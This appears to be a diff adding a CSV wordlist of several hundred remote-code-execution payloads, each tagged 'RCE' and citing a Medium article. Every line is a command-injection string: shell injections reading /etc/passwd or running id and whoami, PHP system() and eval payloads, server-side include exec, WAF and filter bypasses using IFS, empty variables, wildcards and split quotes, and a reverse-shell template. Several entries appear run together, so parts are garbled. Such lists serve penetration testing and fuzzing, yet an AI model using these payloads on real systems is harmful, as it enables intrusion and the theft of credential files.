+,RCE,w%24%7Bu%7Dh%24%7Bu%7Do%24%7Bu%7Da%24%7Bu%7Dm%24%7Bu%7Di,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,i%24%28u%29d,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,i%60u%60d,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7Buname%2C-a%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0aid%0a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0Aid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0Aid%0A,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0a whoami %0a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat%24u%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%22%3Bcat%2B%2Fetc%2Fpasswd%2B%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%2B%24u%2Bcat%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%2B%24u%2Bcat%2B%2Fetc%24u%2Fpasswd%2B%5C%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2F%3F%3F%3F%2F%3F%3Ft%2B%2F%3F%3F%3F%2F%3F%3Fss%3F%3F,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2F%3Fin%2Fcat%2B%2Fet%3F%2Fpassw%3F,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%2Bcat%2B%2Fe%27tc%2Fpass%27wd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,c%5C%5Ca%5C%5Ct%2B%2Fet%5C%5Cc%2Fpas%5C%5Cswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat%20%2Fetc%24u%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%28sy.%28st%29.em%29%28whoami%29%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bcat%2B%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bcat%2B%2Fetc%2Fpasswd%2B%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bcat%24u%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bcat%2520%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bcat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bcat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%7Bcat%2C%2Fetc%2Fpasswd%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bcat%3C%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bcat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Becho%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%2Fusr%2Fbin%2Fid%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7Ccat%2520%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7Ccat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7Ccat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7Bcat%2C%2Fetc%2Fpasswd%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7Ccat%3C%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7Ccat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7Cecho%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%2Fusr%2Fbin%2Fid%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7Ccat%2520%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7Ccat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7Ccat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7C%7Bcat%2C%2Fetc%2Fpasswd%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7Ccat%3C%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7Ccat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7Cecho%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7C%2Fusr%2Fbin%2Fid%7C%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26cat%2520%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26cat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26%7Bcat%2C%2Fetc%2Fpasswd%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26cat%3C%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26cat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26%2Fusr%2Fbin%2Fid%26%26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26cat%2520%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26cat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%7Bcat%2C%2Fetc%2Fpasswd%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26cat%3C%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26cat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%2Fusr%2Fbin%2Fid%26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60cat%2520%2Fetc%2Fpasswd%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60cat%24u%20%2Fetc%24u%2Fpasswd%24u%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60%7Bcat%2C%2Fetc%2Fpasswd%7D%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60cat%3C%2Fetc%2Fpasswd%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60cat%24IFS%2Fetc%2Fpasswd%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60%2Fusr%2Fbin%2Fid%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%28cat%2520%2Fetc%2Fpasswd%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%28cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%28cat%24u%20%2Fetc%24u%2Fpasswd%24u%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%28%7Bcat%2C%2Fetc%2Fpasswd%7D%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%28cat%3C%2Fetc%2Fpasswd%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%28cat%24IFS%2Fetc%2Fpasswd%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%28echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%28%2Fusr%2Fbin%2Fid%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat%20%2Fetc%24u%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%28sy.%28st%29.em%29%28whoami%29%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bcat%2B%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bcat%2B%2Fetc%2Fpasswd%2B%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bcat%24u%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%253B%2524%257B%2540print%2528md5%2528%2522whoami0%2522%2529%2529%257D%253B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%7B%40system%28%22id%22%29%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7Cuname%20-a%2B%7C%7Ca%2B%23%27%2B%7Cls%2B-la%7Ca%2B%23%7C%22%2B%7Cls%2B-la%7C%7Ca%2B%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%22%2Csystem%28%27ls%27%29%3B%22,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%7B%40phpinfo%28%29%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bphpinfo%28%29%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bphpinfo,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bsystem%28%27id%27%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%28id%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%24%7B%40print%28md5%28whoami%29%29%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%24%7B%40print%28md5%28%22whoami%22%29%29%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%3Bid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%24%28%60cat%20%2Fetc%2Fpasswd%60%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7B%7B%20get_user_file%28%22%2Fetc%2Fpasswd%22%29%20%7D%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3C%21--%23exec%20cmd%3D%22id%3B--%3E,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,system%28%27cat%20%2Fetc%2Fpasswd%27%29%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3C%3Fphp%20system%28%22cat%20%2Fetc%2Fpasswd%22%29%3B%3F%3E,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,php%20-r%20%27var_dump%28exec%28%22id%22%29%29%3B%27,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26lt%3B%21--%23exec%2520cmd%3D%26quot%3Bid%3B--%26gt%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat%24u%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2Fbin%24u%2Fbash%24u%20%3Cip%3E%20%3Cport%3E,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%22%3Bcat%2B%2Fetc%2Fpasswd%2B%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%2B%24u%2Bcat%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%2B%24u%2Bcat%2B%2Fetc%24u%2Fpasswd%2B%5C%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2F%3F%3F%3F%2F%3F%3Ft%2B%2F%3F%3F%3F%2F%3F%3Fss%3F%3F,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2F%3Fin%2Fcat%2B%2Fet%3F%2Fpassw%3F,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%2Bcat%2B%2Fe%27tc%2Fpass%27wd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,c%5C%5Ca%5C%5Ct%2B%2Fet%5C%5Cc%2Fpas%5C%5Cswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"|uname -a+||a+#'+|ls+-la|a+#|""+|ls+-la||a+#  Rce waf bypass",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,""",system('ls');"" double quote Rce filter bypass",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"${@system(""id"")} eval code bypass",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,${@phpinfo()},https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;phpinfo();,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;phpinfo,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;system('cat%20/etc/passwd'),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;system('id'),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,$(id),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;${@print(md5(whoami))},https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,";${@print(md5(""whoami""))}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,$;id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,$(`cat /etc/passwd`),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"{{ get_user_file(""/etc/passwd"") }}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"<!--#exec cmd=""id;-->",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,system('cat /etc/passwd');,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"<?php system(""cat /etc/passwd"");?>",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"php -r 'var_dump(exec(""id""));'",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&lt;!--#exec%20cmd=&quot;id;--&gt;/bin$u/bash$u <ip> <port>,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat$u+/etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,""";cat+/etc/passwd+#",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;+$u+cat+/etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;+$u+cat+/etc$u/passwd+\#,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,/???/??t+/???/??ss??,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,/?in/cat+/et?/passw?,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;+cat+/e'tc/pass'wd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,c\\a\\t+/et\\c/pas\\swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat /etc$u/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,(sy.(st).em)(whoami);,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;cat+/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;cat+/etc/passwd+#,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;cat$u+/etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;cat%20/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;cat /e${hahaha}tc/${heywaf}pas${catchthis}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;cat$u /etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,";{cat,/etc/passwd}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;cat</etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;cat$IFS/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,";echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;/usr/bin/id;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,|cat%20/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,|cat /e${hahaha}tc/${heywaf}pas${catchthis}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,|cat$u /etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"|{cat,/etc/passwd}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,|cat</etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,|cat$IFS/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"|echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,|/usr/bin/id|,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,||cat%20/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,||cat /e${hahaha}tc/${heywaf}pas${catchthis}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,||cat$u /etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"||{cat,/etc/passwd}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,||cat</etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,||cat$IFS/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"||echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,||/usr/bin/id||,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&&cat%20/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&&cat /e${hahaha}tc/${heywaf}pas${catchthis}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&&cat$u /etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"&&{cat,/etc/passwd}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&&cat</etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&&cat$IFS/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"&&echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&&/usr/bin/id&&,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&cat%20/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&cat /e${hahaha}tc/${heywaf}pas${catchthis}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&cat$u /etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"&{cat,/etc/passwd}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&cat</etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&cat$IFS/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"&echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&/usr/bin/id&,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,`cat%20/etc/passwd`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,`cat /e${hahaha}tc/${heywaf}pas${catchthis}swd`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,`cat$u /etc$u/passwd$u`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"`{cat,/etc/passwd}`",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,`cat</etc/passwd`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,`cat$IFS/etc/passwd`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"`echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd`",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,`/usr/bin/id`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,$(cat%20/etc/passwd),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,$(cat /e${hahaha}tc/${heywaf}pas${catchthis}swd),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,$(cat$u /etc$u/passwd$u),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"$({cat,/etc/passwd})",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,$(cat</etc/passwd),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,$(cat$IFS/etc/passwd),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"$(echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd)",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,$(/usr/bin/id)id||whoami;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,id|whoami;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,id&&whoami;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,id&whoami;127.0.0.1;ls,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"127.0.0.1;i""d",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,";unam""e${IFS}-a",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,";l""s${IFS}-la'i'd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"""i""d",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,\u\n\a\m\e \-\a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat$u /etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,w${u}h${u}o${u}a${u}m${u}i,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,i$(u)d,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"i`u`d{uname,-a}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat${IFS}/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
